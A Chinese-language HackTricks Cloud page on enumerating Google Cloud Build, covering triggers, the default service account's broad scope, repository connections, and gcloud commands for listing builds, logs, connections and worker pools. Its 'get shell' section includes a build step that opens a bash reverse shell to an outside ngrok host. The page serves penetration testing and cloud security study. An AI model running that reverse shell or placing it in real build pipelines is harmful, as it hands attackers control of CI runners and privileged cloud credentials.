# GCP - Cloud Build Enum

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs收藏品](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

Google Cloud Build是一个托管的CI/CD平台，**自动化软件构建**和发布流程，与**源代码仓库**集成，支持多种编程语言。它允许开发人员**自动构建、测试和部署代码**，同时提供灵活性来定制构建步骤和工作流程。

每个Cloud Build触发器**与Cloud存储库相关联，或直接连接到外部存储库**（Github、Bitbucket和Gitlab）。

{% hint style="success" %}
我没有看到从这里或Cloud存储库中窃取Github/Bitbucket令牌的方法，因为当存储库被下载时，它是通过[https://source.cloud.google.com/](https://source.cloud.google.com/) URL访问的，而Github不是由客户端访问的。
{% endhint %}

### 事件

Cloud Build可以在以下情况下触发：

- **推送到分支**：指定分支
- **推送新标签**：指定标签
- **拉取请求**：指定接收PR的分支
- **手动调用**
- **Pub/Sub消息**：指定主题
- **Webhook事件**：将公开一个HTTPS URL，请求必须使用密钥进行身份验证

### 执行

有3个选项：

- 一个yaml/json，**指定要执行的命令**。通常是：`/cloudbuild.yaml`
- 只能在Web控制台和cli中“内联”指定一个
- 最常见的选项
- 适用于未经身份验证的访问
- 一个**Dockerfile**用于构建
- 一个**Buildpack**用于构建

### SA权限

**服务帐号具有`cloud-platform`范围**，因此可以**使用所有特权**。如果**未指定SA**（例如在提交时），将使用**默认SA** `<proj-number>@cloudbuild.gserviceaccount.com`。

默认情况下不会授予任何权限，但很容易给予一些权限：

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 批准

可以配置Cloud Build以**要求批准构建执行**（默认情况下已禁用）。

### 连接和存储库

可以通过以下方式创建连接：

- **GitHub：**它将显示一个OAuth提示，请求权限以**获取Github令牌**，该令牌将存储在**Secret Manager**中。
- **GitHub企业版：**它将要求安装**GithubApp**。将创建一个来自GitHub企业版主机的**身份验证令牌**，并将其存储在此项目中作为**Secret Manager**的秘密。
- **GitLab / 企业版：**您需要提供API访问令牌和读API访问令牌，这将存储在**Secret Manager**中。

生成连接后，您可以使用它来**链接Github帐户具有访问权限的存储库**。

此选项可通过按钮访问：

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
请注意，通过此方法连接的存储库**仅在使用第二代触发器时可用**。
{% endhint %}

### 连接存储库

这与**`连接`**不同。这允许以**不同**方式访问**Github或Bitbucket**存储库，但**不会生成连接对象，但会生成存储库对象（第一代）。**

此选项可通过按钮访问：

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 存储

有时Cloud Build将**生成新的存储空间以存储触发器的文件**。例如，在GCP提供的示例中发生了这种情况：
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### 获取 shell

创建了一个名为 [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) 的存储桶，用于存储要使用的`.tgz`文件。
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
在Cloud Build中安装gcloud：

```bash
RUN apt-get update && apt-get install -y wget
RUN wget https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-sdk-333.0.0-linux-x86_64.tar.gz
RUN tar zxvf google-cloud-sdk-333.0.0-linux-x86_64.tar.gz
RUN ./google-cloud-sdk/install.sh
```
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### 枚举

您可以在构建配置和日志中找到敏感信息。
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### 提权

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### 未经身份验证的访问

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### 漏洞利用后期阶段

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
